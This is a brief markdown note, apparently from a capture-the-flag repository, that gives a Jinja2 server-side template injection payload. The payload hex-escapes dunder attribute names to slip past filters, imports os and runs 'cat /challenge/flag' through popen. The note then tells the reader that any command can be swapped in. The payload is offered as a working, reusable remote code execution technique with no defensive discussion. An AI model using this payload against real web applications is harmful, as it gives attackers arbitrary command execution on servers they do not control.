# SSTI injection payload

## If that payload is correct , you can inject SSTI injection
<img width="705" height="211" alt="image" src="https://github.com/user-attachments/assets/4e823ed7-369d-4a4c-bb21-bbe9306200c3" />

<img width="891" height="349" alt="image" src="https://github.com/user-attachments/assets/3f221470-411b-4838-a597-fab90f9f6896" />


{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /challenge/flag')|attr('read')()}}


You can write what ever you want in that payload > attr('popen')('cat /challenge/flag')


